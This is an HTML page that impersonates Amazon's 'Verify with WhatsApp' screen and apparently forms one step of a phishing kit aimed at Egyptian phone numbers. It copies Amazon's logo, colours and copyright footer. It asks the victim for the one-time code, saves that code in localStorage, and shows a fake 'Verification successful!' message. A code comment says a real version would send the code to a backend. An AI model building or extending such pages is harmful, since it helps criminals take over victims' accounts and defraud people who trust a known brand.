<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Amazon - Verify with WhatsApp</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: "Amazon Ember", Arial, sans-serif;
            background: #f3f3f3;
            min-height: 100vh;
            color: #0F1111;
            -webkit-tap-highlight-color: transparent;
        }

        /* Header */
        .header {
            background: #fff;
            padding: 9px;
            text-align: center;
            border-bottom: 1px solid #e7e7e7;
        }

        .header img {
            height: 59px;
            width: auto;
            display: inline-block;
        }

        /* Main Content */
        .main {
            padding: 30px;
            max-width: 480px;
            margin: 0 auto;
        }

        /* Card */
        .card {
            background: #fff;
            border: 1px solid #ddd;
            border-radius: 8px;
            padding: 24px 20px;
            margin-bottom: 20px;
        }

        /* Title with WhatsApp icon */
        .title-row {
            display: flex;
            align-items: center;
            gap: 10px;
            margin-bottom: 12px;
        }

        .whatsapp-icon {
            width: 28px;
            height: 28px;
            background: #25D366;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            flex-shrink: 0;
        }

        .whatsapp-icon svg {
            width: 16px;
            height: 16px;
            fill: #fff;
        }

        .card-title {
            font-size: 20px;
            font-weight: 700;
            color: #0F1111;
        }

        /* Phone display */
        .phone-display {
            font-size: 16px;
            color: #0F1111;
            margin-bottom: 8px;
            font-weight: 500;
        }

        .phone-display .change-link {
            color: #0066c0;
            text-decoration: none;
            font-size: 14px;
            margin-left: 6px;
            font-weight: 400;
        }

        .phone-display .change-link:hover {
            color: #C7511F;
            text-decoration: underline;
        }

        /* Description */
        .description {
            font-size: 14px;
            color: #0F1111;
            margin-bottom: 20px;
            line-height: 1.4;
        }

        /* OTP Input */
        .form-group {
            margin-bottom: 16px;
        }

        .form-label {
            display: block;
            font-size: 14px;
            font-weight: 700;
            margin-bottom: 6px;
            color: #0F1111;
        }

        .form-input {
            width: 100%;
            padding: 10px 12px;
            border: 1px solid #a6a6a6;
            border-radius: 4px;
            font-size: 16px;
            outline: none;
            transition: border-color 0.2s, box-shadow 0.2s;
            -webkit-appearance: none;
            text-align: center;
            letter-spacing: 8px;
            font-weight: 500;
        }

        .form-input:focus {
            border-color: #e77600;
            box-shadow: 0 0 0 3px rgba(231, 118, 0, 0.3);
        }

        .form-input::placeholder {
            color: #767676;
            letter-spacing: normal;
        }

        /* Verify Button */
        .btn-verify {
            width: 100%;
            padding: 12px;
            background: #FFD814;
            border: 1px solid #FCD200;
            border-radius: 8px;
            font-size: 15px;
            font-weight: 500;
            color: #0F1111;
            cursor: pointer;
            transition: background 0.2s;
            margin-bottom: 16px;
        }

        .btn-verify:active {
            background: #F7CA00;
        }

        /* Resend Link */
        .resend-link {
            display: block;
            text-align: center;
            color: #0066c0;
            font-size: 14px;
            text-decoration: none;
            margin-bottom: 20px;
        }

        .resend-link:hover {
            color: #C7511F;
            text-decoration: underline;
        }

        /* Divider */
        .divider {
            display: flex;
            align-items: center;
            gap: 12px;
            margin: 20px 0;
        }

        .divider-line {
            flex: 1;
            height: 1px;
            background: #ddd;
        }

        .divider-text {
            font-size: 12px;
            color: #767676;
        }

        /* WhatsApp Info */
        .whatsapp-info {
            margin-top: 20px;
        }

        .whatsapp-info-title {
            font-size: 16px;
            font-weight: 700;
            color: #0F1111;
            margin-bottom: 4px;
        }

        .whatsapp-info-text {
            font-size: 14px;
            color: #0F1111;
            line-height: 1.4;
        }

        /* Footer */
        .footer {
            background: #f3f3f3;
            padding: 24px 20px;
            text-align: center;
            border-top: 1px solid #e7e7e7;
            margin-top: 20px;
        }

        .footer-links {
            display: flex;
            justify-content: center;
            gap: 20px;
            margin-bottom: 8px;
            flex-wrap: wrap;
        }

        .footer-links a {
            color: #0066c0;
            font-size: 12px;
            text-decoration: none;
        }

        .footer-links a:hover {
            color: #C7511F;
            text-decoration: underline;
        }

        .footer-copy {
            color: #565959;
            font-size: 11px;
        }

        /* Error */
        .error-msg {
            display: none;
            color: #c40000;
            font-size: 12px;
            margin-top: 4px;
            text-align: center;
        }

        .error-msg.show {
            display: block;
        }

        .form-input.error {
            border-color: #c40000;
            box-shadow: 0 0 0 1px #c40000;
        }

        /* Success overlay */
        .success-overlay {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: rgba(255,255,255,0.95);
            z-index: 1000;
            align-items: center;
            justify-content: center;
            flex-direction: column;
        }

        .success-overlay.show {
            display: flex;
        }

        .success-icon {
            width: 60px;
            height: 60px;
            background: #00A8E1;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            margin-bottom: 16px;
        }

        .success-icon svg {
            width: 30px;
            height: 30px;
            fill: #fff;
        }

        .success-text {
            font-size: 18px;
            font-weight: 500;
            color: #0F1111;
        }
    </style>
</head>
<body>
    <!-- Header -->
    <div class="header">
        <img src="amazon-logo.png.jpg" alt="Amazon">
    </div>

    <!-- Main Content -->
    <div class="main">
        <div class="card">
            <!-- Title with WhatsApp Icon -->
            <div class="title-row">
                <div class="whatsapp-icon">
                    <svg viewBox="0 0 24 24"><path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87 0 01-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86 0 01-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 012.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815 0 0012.05 0C5.495 0 .16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L.057 24l6.305-1.654a11.882 11.882 0 005.683 1.448h.005c6.554 0 11.89-5.335 11.893-11.893a11.821 11.821 0 00-3.48-8.413z"/></svg>
                </div>
                <h1 class="card-title">Verify with WhatsApp</h1>
            </div>

            <!-- Phone Number Display -->
            <div class="phone-display">
                <span id="displayCountry">EG</span> <span id="displayPhone">+20...</span>
                <a href="login.html" class="change-link">Change</a>
            </div>

            <!-- Description -->
            <p class="description">Enter the OTP we sent you on WhatsApp.</p>

            <!-- OTP Form -->
            <form id="otpForm">
                <div class="form-group">
                    <label class="form-label" for="otp">Enter OTP</label>
                    <input 
                        type="text" 
                        id="otp" 
                        class="form-input" 
                        placeholder=""
                        maxlength="6"
                        inputmode="numeric"
                        autocomplete="one-time-code"
                    >
                    <div class="error-msg" id="otpError">Please enter the OTP code</div>
                </div>

                <button type="submit" class="btn-verify">Verify</button>
            </form>

            <!-- Resend -->
            <a href="#" class="resend-link" id="resendLink">Resend OTP</a>

            <!-- Divider -->
            <div class="divider">
                <div class="divider-line"></div>
                <span class="divider-text">or</span>
                <div class="divider-line"></div>
            </div>

            <!-- WhatsApp Info -->
            <div class="whatsapp-info">
                <p class="whatsapp-info-title">Don't have WhatsApp?</p>
                <p class="whatsapp-info-text">You can download it from the app store.</p>
            </div>
        </div>
    </div>

    <!-- Footer -->
    <div class="footer">
        <div class="footer-links">
            <a href="#">Conditions of Use</a>
            <a href="#">Privacy Notice</a>
            <a href="#">Help</a>
        </div>
        <div class="footer-copy">©1996–2026, Amazon.com, Inc. or its affiliates</div>
    </div>

    <!-- Success Overlay -->
    <div class="success-overlay" id="successOverlay">
        <div class="success-icon">
            <svg viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg>
        </div>
        <div class="success-text">Verification successful!</div>
    </div>

    <script>
        // Get phone from localStorage (set by login page)
        const phone = localStorage.getItem('client_phone') || '+20XXXXXXXXXX';
        document.getElementById('displayPhone').textContent = phone;

        // Handle OTP submission
        document.getElementById('otpForm').addEventListener('submit', function(e) {
            e.preventDefault();

            const otpInput = document.getElementById('otp');
            const otpError = document.getElementById('otpError');

            if (!otpInput.value.trim() || otpInput.value.length < 4) {
                otpInput.classList.add('error');
                otpError.classList.add('show');
                return;
            }

            otpInput.classList.remove('error');
            otpError.classList.remove('show');

            // Save OTP
            localStorage.setItem('client_otp', otpInput.value.trim());
            localStorage.setItem('client_status', 'otp_submitted');

            // Show success
            document.getElementById('successOverlay').classList.add('show');

            // In real app, send to backend
            // For now, just show success
            setTimeout(() => {
                // Could redirect to amazon.eg or show final message
                alert('OTP submitted: ' + otpInput.value.trim());
            }, 1500);
        });

        // Remove error on input
        document.getElementById('otp').addEventListener('input', function() {
            this.classList.remove('error');
            document.getElementById('otpError').classList.remove('show');

            // Only allow numbers
            this.value = this.value.replace(/[^0-9]/g, '');
        });

        // Resend link
        document.getElementById('resendLink').addEventListener('click', function(e) {
            e.preventDefault();
            this.textContent = 'OTP sent!';
            this.style.color = '#25D366';
            setTimeout(() => {
                this.textContent = 'Resend OTP';
                this.style.color = '';
            }, 3000);
        });
    </script>
</body>
</html>
